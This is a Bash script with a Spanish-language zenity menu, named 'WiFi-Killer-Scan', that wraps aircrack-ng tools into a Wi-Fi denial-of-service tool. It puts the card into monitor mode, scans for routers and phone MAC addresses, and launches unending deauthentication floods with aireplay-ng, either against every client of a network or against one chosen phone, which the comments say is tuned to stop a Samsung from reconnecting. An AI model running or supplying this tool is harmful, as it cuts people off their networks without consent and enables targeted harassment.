#!/bin/bash
# WiFi-Killer-Scan v13.0 - Optimizado para Samsung A16/Modelos Nuevos

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi-Killer-Scan: SEGURIDAD AVANZADA" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=750 --height=600 \
        1 "⚡ MODO MONITOR" "Activar interfaz y limpiar procesos" \
        2 "🔍 ESCANEO" "Identificar Router y MAC del celular" \
        3 "🔥 BLOQUEO TOTAL" "Desconecta a todos (Broadcast)" \
        4 "🎯 BLOQUEO DIRIGIDO" "Ataque agresivo contra un solo celular" \
        5 "🌐 RESTAURAR" "Apagar monitor y volver a Internet" \
        6 "❌ SALIR" "Cerrar")

    if [ $? -ne 0 ]; then break; fi

    case $CHOICE in
        1)
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0 | zenity --text-info ;;
        2)
            gnome-terminal --title="LISTA DE OBJETIVOS" -- sh -c "sudo airodump-ng wlan0mon; exec bash" ;;
        3)
            BSSID=$(zenity --entry --text="BSSID del Router:")
            CANAL=$(zenity --entry --text="Canal:")
            if [ ! -z "$BSSID" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                xterm -hold -fg yellow -bg black -e "sudo aireplay-ng -0 0 -a $BSSID wlan0mon" &
            fi ;;
        4)
            # BLOQUEO ESPECÍFICO PARA SAMSUNG/MODELOS NUEVOS
            BSSID=$(zenity --entry --text="BSSID del Router:")
            CLIENTE=$(zenity --entry --text="MAC del Celular (Aparece en Stations):")
            CANAL=$(zenity --entry --text="Canal:")
            
            if [ ! -z "$BSSID" ] && [ ! -z "$CLIENTE" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                # Ataque de alta velocidad (-D) para no dejar que el Samsung se reconecte
                xterm -hold -fg red -bg black -title "ATAQUE DIRIGIDO: $CLIENTE" \
                -e "echo 'FUEGO CONTRA: $CLIENTE'; sudo aireplay-ng -0 0 -a $BSSID -c $CLIENTE --ignore-negative-one wlan0mon" &
                ATAQUE_PID=$!
                
                zenity --info --text="Ataque dirigido activo contra el Samsung.\n\nPresiona OK para detener."
                sudo kill $ATAQUE_PID && sudo killall aireplay-ng 2>/dev/null
            fi ;;
        5)
            sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
            zenity --info --text="Internet restaurado." ;;
        6) exit ;;
    esac
done
